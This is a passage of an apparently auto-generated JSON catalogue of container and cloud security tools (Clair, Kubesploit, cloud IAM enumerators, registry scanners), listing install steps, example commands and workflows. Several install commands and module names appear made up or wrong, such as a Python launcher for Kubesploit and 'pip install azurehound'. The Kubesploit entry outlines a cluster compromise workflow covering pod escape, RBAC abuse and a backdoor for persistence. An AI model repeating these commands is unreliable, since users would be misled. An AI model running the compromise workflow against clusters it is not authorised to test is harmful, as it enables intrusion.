            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Analyze container image",
        "command": "clairctl analyze nginx:latest",
        "notes": ["Analyzes image for vulnerabilities"]
      },
      {
        "description": "Check Clair status",
        "command": "curl http://localhost:6060/v1/namespaces",
        "notes": ["Checks Clair API status"]
      }
    ],
    "step_sequences": [
      {
        "title": "Container Security Analysis",
        "steps": [
          {
            "title": "Start Clair service",
            "details": "Launch Clair vulnerability scanner",
            "command": "docker-compose up -d"
          },
          {
            "title": "Analyze image",
            "details": "Submit image for analysis",
            "command": "clairctl analyze application:latest"
          },
          {
            "title": "Review results",
            "details": "Check vulnerability report",
            "command": "clairctl report application:latest"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "Enterprise Container Scanning",
        "stages": [
          {
            "label": "Deploy Clair",
            "description": "Set up Clair infrastructure",
            "command": "kubectl apply -f clair-deployment.yaml"
          },
          {
            "label": "Configure scanners",
            "description": "Set up image scanning workflows",
            "command": "# Configure registry webhooks"
          },
          {
            "label": "Automate scanning",
            "description": "Integrate with CI/CD pipeline",
            "command": "# Add scanning stages to pipeline"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "Vulnerability detected",
        "meaning": "Security issue found in container",
        "severity": "medium"
      },
      {
        "indicator": "Analysis complete",
        "meaning": "Container analysis finished",
        "severity": "info"
      }
    ],
    "advanced_usage": [
      {
        "title": "Custom vulnerability sources",
        "command": "# Configure additional vulnerability feeds",
        "scenario": "Extend Clair with custom data sources",
        "notes": ["Add internal vulnerability databases"]
      }
    ],
    "resources": [
      {
        "label": "Clair Documentation",
        "url": "https://github.com/quay/clair",
        "description": "Official repository and documentation"
      }
    ]
  },
  {
    "id": "kubesploit",
    "name": "Kubesploit",
    "summary": "Kubesploit is a penetration testing framework for Kubernetes clusters, providing modules for various attack scenarios.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": "Install from source",
        "steps": [
          {
            "detail": "sudo apt update",
            "copyable": true
          },
          {
            "detail": "git clone https://github.com/cyberark/kubesploit.git",
            "copyable": true
          },
          {
            "detail": "cd kubesploit",
            "copyable": true
          },
          {
            "detail": "pip install -r requirements.txt",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Install dependencies",
        "steps": [
          {
            "detail": "git clone https://github.com/cyberark/kubesploit.git",
            "copyable": true
          },
          {
            "detail": "cd kubesploit",
            "copyable": true
          },
          {
            "detail": "python3 kubesploit.py",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker / Alternative",
        "summary": "Run from container",
        "steps": [
          {
            "detail": "docker build -t kubesploit .",
            "copyable": true
          },
          {
            "detail": "docker run -it kubesploit",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Start Kubesploit framework",
        "command": "python3 kubesploit.py",
        "notes": ["Launches the Kubernetes exploitation framework"]
      },
      {
        "description": "List available modules",
        "command": "show modules",
        "notes": ["Displays all attack modules"]
      }
    ],
    "step_sequences": [
      {
        "title": "Kubernetes Penetration Testing",
        "steps": [
          {
            "title": "Configure access",
            "details": "Set up Kubernetes access",
            "command": "export KUBECONFIG=~/.kube/config"
          },
          {
            "title": "Start framework",
            "details": "Launch Kubesploit",
            "command": "python3 kubesploit.py"
          },
          {
            "title": "Enumerate cluster",
            "details": "Discover cluster information",
            "command": "use recon/cluster_enum"
          },
          {
            "title": "Execute attacks",
            "details": "Run exploitation modules",
            "command": "run"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "Cluster Compromise Testing",
        "stages": [
          {
            "label": "Initial access",
            "description": "Gain initial cluster access",
            "command": "use attack/pod_escape"
          },
          {
            "label": "Privilege escalation",
            "description": "Escalate privileges",
            "command": "use privesc/rbac_abuse"
          },
          {
            "label": "Persistence",
            "description": "Maintain access",
            "command": "use persistence/backdoor"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "Cluster compromised",
        "meaning": "Successful cluster exploitation",
        "severity": "critical"
      },
      {
        "indicator": "Access denied",
        "meaning": "Insufficient permissions",
        "severity": "medium"
      }
    ],
    "advanced_usage": [
      {
        "title": "Custom module development",
        "command": "# Create modules in modules/",
        "scenario": "Develop custom attack modules",
        "notes": ["Follow Kubesploit module framework"]
      }
    ],
    "resources": [
      {
        "label": "Kubesploit GitHub",
        "url": "https://github.com/cyberark/kubesploit",
        "description": "Official repository and documentation"
      }
    ]
  },
  {
    "id": "cloud-iam-enum",
    "name": "Cloud IAM Enumerators",
    "summary": "Collection of tools for enumerating cloud IAM permissions and identifying privilege escalation paths across multiple cloud providers.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": "Install various IAM tools",
        "steps": [
          {
            "detail": "sudo apt update",
            "copyable": true
          },
          {
            "detail": "pip install aws-iam-privesc",
            "copyable": true
          },
          {
            "detail": "pip install azurehound",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Install IAM enumeration tools",
        "steps": [
          {
            "detail": "git clone https://github.com/RhinoSecurityLabs/pacu.git",
            "copyable": true
          },
          {
            "detail": "git clone https://github.com/BloodHoundAD/AzureHound.git",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker / Alternative",
        "summary": "Run IAM tools in containers",
        "steps": [
          {
            "detail": "docker pull python:3.9",
            "copyable": true
          },
          {
            "detail": "docker run -it python:3.9 bash",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "AWS IAM privilege escalation check",
        "command": "python3 aws_iam_privesc.py",
        "notes": ["Checks for AWS IAM privilege escalation paths"]
      },
      {
        "description": "Azure AD enumeration",
        "command": "azurehound -u user@domain.com -p password",
        "notes": ["Enumerates Azure AD relationships"]
      }
    ],
    "step_sequences": [
      {
        "title": "Cloud IAM Analysis",
        "steps": [
          {
            "title": "Configure cloud credentials",
            "details": "Set up cloud provider credentials",
            "command": "aws configure && az login"
          },
          {
            "title": "Enumerate permissions",
            "details": "Check current IAM permissions",
            "command": "python3 aws_iam_privesc.py"
          },
          {
            "title": "Identify escalation paths",
            "details": "Find privilege escalation opportunities",
            "command": "# Review tool output for escalation vectors"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "Multi-Cloud IAM Assessment",
        "stages": [
          {
            "label": "AWS IAM analysis",
            "description": "Analyze AWS IAM permissions",
            "command": "python3 aws_iam_privesc.py"
          },
          {
            "label": "Azure AD analysis",
            "description": "Map Azure AD relationships",
            "command": "azurehound -c"
          },
          {
            "label": "GCP IAM analysis",
            "description": "Check GCP IAM permissions",
            "command": "gcloud iam service-accounts list"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "Privilege escalation possible",
        "meaning": "Path to higher privileges identified",
        "severity": "high"
      },
      {
            "indicator": "Admin access detected",
            "meaning": "Current credentials have administrative privileges",
            "severity": "high"
          }
    ],
    "advanced_usage": [
      {
        "title": "Cross-cloud analysis",
        "command": "# Combine results from multiple cloud providers",
        "scenario": "Analyze permissions across cloud environments",
        "notes": ["Identify cross-cloud security issues"]
      }
    ],
    "resources": [
      {
        "label": "Cloud IAM Security",
        "url": "https://cloud.google.com/iam",
        "description": "Cloud IAM best practices and documentation"
      }
    ]
  },
  {
    "id": "registry-scanner",
    "name": "Registry Scanners",
    "summary": "Tools for scanning container registries for vulnerabilities, secrets, and security misconfigurations.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": "Install registry scanning tools",
        "steps": [
          {
            "detail": "sudo apt update",
            "copyable": true
          },
          {
            "detail": "pip install trufflehog",
            "copyable": true
          },
          {
            "detail": "pip install registry-scan",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Install security scanning tools",
        "steps": [
          {
            "detail": "git clone https://github.com/aquasecurity/trivy.git",
            "copyable": true
          },
          {
            "detail": "git clone https://github.com/trufflesecurity/trufflehog.git",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker / Alternative",
        "summary": "Run scanners in containers",
        "steps": [
          {
            "detail": "docker pull aquasec/trivy",
            "copyable": true
          },
          {
            "detail": "docker pull trufflesecurity/trufflehog",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Scan Docker Hub repository",
        "command": "trivy image nginx:latest",
        "notes": ["Scans Docker Hub image for vulnerabilities"]
      },
      {
        "description": "Scan for secrets",
        "command": "trufflehog docker://nginx:latest",
        "notes": ["Scans image for exposed secrets"]
      }
    ],
    "step_sequences": [
      {
        "title": "Registry Security Assessment",
        "steps": [
          {
            "title": "Identify registries",
            "details": "List all container registries",
            "command": "# Docker Hub, ECR, GCR, ACR"
          },
          {
            "title": "Scan for vulnerabilities",
            "details": "Check images for security issues",
            "command": "trivy image registry/image:tag"
          },
          {
            "title": "Scan for secrets",
            "details": "Check for exposed credentials",
            "command": "trufflehog docker://registry/image:tag"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "Enterprise Registry Security",
        "stages": [
          {
            "label": "Registry inventory",
            "description": "Catalog all container registries",
            "command": "# List private and public registries"
          },
          {
            "label": "Vulnerability scanning",
            "description": "Scan all images for vulnerabilities",
            "command": "trivy image --severity HIGH,CRITICAL"
          },
          {
            "label": "Secret detection",
            "description": "Scan for exposed secrets",
            "command": "trufflehog --entropy=false"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "Critical vulnerability",
        "meaning": "High-risk security issue found",
        "severity": "critical"
      },
      {
        "indicator": "Secret detected",
        "meaning": "Potential credential exposure",
        "severity": "high"
      }
    ],
    "advanced_usage": [
      {
        "title": "Automated registry monitoring",
        "command": "# Set up webhook-based scanning",
        "scenario": "Scan new images automatically",
        "notes": ["Integrate with registry webhooks"]
      }
    ],
    "resources": [
      {
        "label": "Container Registry Security",
        "url": "https://docs.docker.com/registry/",
        "description": "Docker registry security best practices"
      }
    ]
  }
]